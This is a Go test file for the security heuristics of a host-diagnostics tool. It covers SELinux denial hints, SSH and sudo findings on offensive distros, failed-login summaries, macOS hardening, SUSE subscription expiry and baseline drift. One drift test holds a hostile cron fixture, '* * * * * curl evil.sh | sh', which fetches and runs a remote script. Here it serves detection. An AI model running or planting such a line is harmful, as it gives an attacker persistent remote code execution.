package analysis

import (
	"strings"
	"testing"

	"github.com/keyorixhq/dashdiag/internal/baseline"
	"github.com/keyorixhq/dashdiag/internal/models"
)

// hasHintSubstr reports whether any insight has the given level AND at least one
// hint line containing substr — the hint-line analogue of hasInsightMsg (which
// only inspects Message), needed for the grouped SELinux/AVC/context/top-attacker
// hint lines this file exercises.
func hasHintSubstr(insights []models.Insight, level, substr string) bool {
	for _, ins := range insights {
		if ins.Level != level {
			continue
		}
		for _, h := range ins.Hints {
			if strings.Contains(h, substr) {
				return true
			}
		}
	}
	return false
}

// Fills specific branch gaps in heuristics_security.go left uncovered by the
// existing security test files: checkSecurityAuditGaps' NeedsRoot INFO,
// SSHPasswordAuth's offensive-distro downgrade, checkFailedLoginAttempts'
// FailedLoginIPs summary, checkPrivilegeEscalationVectors' offensive-distro
// downgrade, checkSecuritySELinuxDenials' grouped-AVC/unlabeled-port/context-issue
// hints, checkSUSESecurityHardening's supportconfig branches, checkMacOSHardening,
// checkSecurityDrift's Added/RemovedSSHFiles + NewCronEntries, and checkAuth's
// TopSources hint line.

func TestCheckSecurityAuditGaps_NeedsRoot(t *testing.T) {
	t.Parallel()
	if !hasInsightMsg(checkSecurityAuditGaps(models.SecurityInfo{NeedsRoot: true}), "INFO", "some checks limited") {
		t.Error("NeedsRoot must produce the audit-gap INFO insight")
	}
	if got := checkSecurityAuditGaps(models.SecurityInfo{NeedsRoot: false}); len(got) != 0 {
		t.Errorf("NeedsRoot=false with no other gaps must produce no insight, got %+v", got)
	}
}

// TestCheckSecurityAuditGaps_SELinuxDenialsUnverified is a regression guard
// for measurement-honesty-01: checkSecuritySELinuxDenials only tests
// SELinuxDenials >= 10, which is false for the -1 "unknown" sentinel, so a
// host where SELinux is enforcing but the audit log/ausearch were both
// unreadable produced ZERO insights — not even an INFO. Its sibling
// checkSELinuxDenials (heuristics_system.go) already discloses this same
// sentinel; checkSecurityAuditGaps must too, or `dsd security`'s verdict has
// no SELinux caveat even though denials were never actually read.
func TestCheckSecurityAuditGaps_SELinuxDenialsUnverified(t *testing.T) {
	t.Parallel()
	if !hasInsightMsg(checkSecurityAuditGaps(models.SecurityInfo{SELinuxMode: "enforcing", SELinuxDenials: -1}),
		"INFO", "could NOT be verified") {
		t.Error("SELinux enforcing with denials unverified (-1) must produce an INFO disclosure")
	}
	if got := checkSecurityAuditGaps(models.SecurityInfo{SELinuxMode: "permissive", SELinuxDenials: -1}); len(got) != 0 {
		t.Errorf("permissive mode must not trigger the enforcing-only disclosure, got %+v", got)
	}
	if got := checkSecurityAuditGaps(models.SecurityInfo{SELinuxMode: "enforcing", SELinuxDenials: 0}); len(got) != 0 {
		t.Errorf("denials actually measured (0, not -1) must not trigger the disclosure, got %+v", got)
	}
}

func TestCheckSecuritySSH_PasswordAuthOffensiveDistro(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{SSHPasswordAuth: true, IsOffensiveDistro: true}
	if !hasInsightMsg(checkSecurity(sec), "INFO", "expected on offensive security distro") {
		t.Errorf("offensive-distro password auth must downgrade to INFO, got %+v", checkSecurity(sec))
	}
}

func TestCheckFailedLoginAttempts_WithTopIPs(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{FailedLogins: 25, FailedLoginIPs: []string{"1.2.3.4", "5.6.7.8", "9.9.9.9", "1.1.1.1"}}
	out := checkFailedLoginAttempts(sec)
	if !hasInsightMsg(out, "CRIT", "top sources: 1.2.3.4, 5.6.7.8, 9.9.9.9") {
		t.Errorf("CRIT burst with >=4 IPs must list only the top 3, got %+v", out)
	}
}

func TestCheckPrivilegeEscalationVectors_OffensiveDistro(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{SudoNopasswd: []string{"%kali-trusted"}, IsOffensiveDistro: true}
	out := checkPrivilegeEscalationVectors(sec)
	if !hasInsightMsg(out, "INFO", "expected on offensive security distro") {
		t.Errorf("offensive-distro NOPASSWD must downgrade to INFO, got %+v", out)
	}
}

func TestCheckSecuritySELinuxDenials_GroupedAVCWithBooleanFix(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{
		SELinuxDenials: 15,
		SELinuxMode:    "enforcing",
		SELinuxAVCGroups: []models.SELinuxAVCGroup{
			{Scontext: "httpd_t", Tcontext: "container_file_t", Tclass: "file", Count: 5, BooleanFix: "httpd_can_network_connect"},
			{Scontext: "init_t", Tcontext: "unlabeled_t", Tclass: "dir", Count: 1}, // below the 3-count floor: skipped
		},
	}
	out := checkSecuritySELinuxDenials(sec)
	if !hasHintSubstr(out, "WARN", "setsebool -P httpd_can_network_connect on") {
		t.Errorf("grouped AVC with BooleanFix must surface a setsebool hint, got %+v", out)
	}
	if hasHintSubstr(out, "WARN", "unlabeled_t") {
		t.Errorf("a group with count below 3 must be skipped, got %+v", out)
	}
}

func TestCheckSecuritySELinuxDenials_GroupedAVCWithFixCmd(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{
		SELinuxDenials: 15,
		SELinuxMode:    "enforcing",
		SELinuxAVCGroups: []models.SELinuxAVCGroup{
			{Scontext: "httpd_t", Tcontext: "var_t", Tclass: "file", Count: 4, FixCmd: "semanage fcontext -a -t var_t '/srv/app(/.*)?'"},
		},
	}
	out := checkSecuritySELinuxDenials(sec)
	if !hasHintSubstr(out, "WARN", "fix: semanage fcontext") {
		t.Errorf("grouped AVC with FixCmd (no BooleanFix) must surface the fix command, got %+v", out)
	}
}

func TestCheckSecuritySELinuxDenials_UnlabeledPorts(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{
		SELinuxUnlabeledPorts: []models.SELinuxUnlabeledPort{
			{Port: 9090, Protocol: "tcp", Process: "myapp"},
			{Port: 9091, Protocol: "tcp"}, // no process name
		},
	}
	out := checkSecuritySELinuxDenials(sec)
	if !hasInsightMsg(out, "WARN", "2 listening port(s) have no SELinux port label") {
		t.Errorf("unlabeled ports must WARN with count, got %+v", out)
	}
	if !hasHintSubstr(out, "WARN", "unknown process") {
		t.Errorf("a port with no process name must render 'unknown process', got %+v", out)
	}
}

func TestCheckSecuritySELinuxDenials_ContextIssues(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{
		SELinuxContextIssues: []models.SELinuxContextIssue{
			{Path: "/srv/app/data", ActualContext: "admin_home_t", ExpectedContext: "var_t"},
		},
	}
	out := checkSecuritySELinuxDenials(sec)
	if !hasInsightMsg(out, "WARN", "1 denial-implicated path(s)") {
		t.Errorf("context issues must WARN with count, got %+v", out)
	}
	if !hasHintSubstr(out, "WARN", "/srv/app/data — actual: admin_home_t, expected: var_t") {
		t.Errorf("context issue detail line must be included, got %+v", out)
	}
}

func TestCheckSUSESecurityHardening_SupportconfigNeverRun(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{SupportconfigAvailable: true, SupportconfigLastRunDays: -1}
	if !hasInsightMsg(checkSUSESecurityHardening(sec), "INFO", "never run") {
		t.Errorf("never-run supportconfig must INFO, got %+v", checkSUSESecurityHardening(sec))
	}
}

func TestCheckSUSESecurityHardening_SupportconfigStale(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{SupportconfigAvailable: true, SupportconfigLastRunDays: 45}
	if !hasInsightMsg(checkSUSESecurityHardening(sec), "INFO", "last run 45 day(s) ago") {
		t.Errorf("stale supportconfig must INFO with day count, got %+v", checkSUSESecurityHardening(sec))
	}
}

func TestCheckSUSESecurityHardening_SUSEConnectExpiryBoundaries(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		expiresDays int
		wantLevel   string
		wantMsg     string
	}{
		{"expired", 0, "CRIT", "EXPIRED"},
		{"expiring soon", 7, "CRIT", "expires in 7 day(s)"},
		{"expiring at boundary", 14, "CRIT", "expires in 14 day(s)"},
		{"not expiring soon", 30, "", ""},
		// Regression: -1 is the collector's "unknown" sentinel (registered,
		// expiry unreadable) — must disclose an INFO, not silently fall
		// through to the same "" as a confirmed->30-days-left host. Mirrors
		// checkSUSESubscription's identical guard over the same raw signal.
		{"expiry unknown (-1 sentinel)", -1, "INFO", "could not be determined"},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			sec := models.SecurityInfo{SUSEConnectRegistered: true, SUSEConnectExpiresDays: tt.expiresDays}
			out := checkSUSESecurityHardening(sec)
			if tt.wantLevel == "" {
				if hasInsightMsg(out, "CRIT", "SUSEConnect") {
					t.Errorf("expiresDays=%d must not CRIT, got %+v", tt.expiresDays, out)
				}
				return
			}
			if !hasInsightMsg(out, tt.wantLevel, tt.wantMsg) {
				t.Errorf("expiresDays=%d: want %s containing %q, got %+v", tt.expiresDays, tt.wantLevel, tt.wantMsg, out)
			}
		})
	}
}

func TestCheckMacOSHardening_AllFindings(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{
		IsDarwin:          true,
		FileVaultEnabled:  false,
		SIPEnabled:        false,
		GatekeeperEnabled: false,
	}
	out := checkMacOSHardening(sec)
	if !hasInsightMsg(out, "WARN", "FileVault disk encryption is off") {
		t.Errorf("FileVault off must WARN, got %+v", out)
	}
	if !hasInsightMsg(out, "CRIT", "System Integrity Protection") {
		t.Errorf("SIP off must CRIT, got %+v", out)
	}
	if !hasInsightMsg(out, "WARN", "Gatekeeper is disabled") {
		t.Errorf("Gatekeeper off must WARN, got %+v", out)
	}
}

func TestCheckMacOSHardening_AllEnabledIsClean(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{
		IsDarwin:          true,
		FileVaultEnabled:  true,
		SIPEnabled:        true,
		GatekeeperEnabled: true,
	}
	if got := checkMacOSHardening(sec); len(got) != 0 {
		t.Errorf("all hardening enabled must produce no insight, got %+v", got)
	}
}

func TestCheckMacOSHardening_NotDarwinIsNoop(t *testing.T) {
	t.Parallel()
	sec := models.SecurityInfo{IsDarwin: false, FileVaultEnabled: false, SIPEnabled: false, GatekeeperEnabled: false}
	if got := checkMacOSHardening(sec); len(got) != 0 {
		t.Errorf("non-darwin host must produce no macOS insight regardless of flags, got %+v", got)
	}
}

func TestCheckSecurityDrift_AddedRemovedSSHAndCron(t *testing.T) {
	t.Parallel()
	assertLevel(t, checkSecurityDrift(&baseline.SecurityDiff{AddedSSHFiles: []string{"99-evil.conf"}}), "WARN")
	assertLevel(t, checkSecurityDrift(&baseline.SecurityDiff{RemovedSSHFiles: []string{"10-hardening.conf"}}), "WARN")
	assertLevel(t, checkSecurityDrift(&baseline.SecurityDiff{NewCronEntries: []string{"* * * * * curl evil.sh | sh"}}), "WARN")
}

// TestCheckSecurityDrift_RemovedSUIDs is the regression test for
// internal-baseline-01-02: a removed SUID binary must drive a CRIT insight
// (and therefore HasChanges()==true, since checkSecurityDrift is gated on
// it) — previously it produced zero insights, identical to no drift at all.
func TestCheckSecurityDrift_RemovedSUIDs(t *testing.T) {
	t.Parallel()
	assertLevel(t, checkSecurityDrift(&baseline.SecurityDiff{RemovedSUIDs: []string{"/usr/bin/su"}}), "CRIT")
}

func TestCheckAuth_TopSourceHint(t *testing.T) {
	t.Parallel()
	a := models.AuthInfo{
		Available: true, Checked: true, FailedLast24h: 1500,
		TopSources: []models.FailedLoginSource{{Source: "203.0.113.9", Count: 40}},
	}
	out := checkAuth(a)
	if !hasHintSubstr(out, "WARN", "top attacker: 203.0.113.9 (40 attempts)") {
		t.Errorf("TopSources must surface a top-attacker hint, got %+v", out)
	}
}
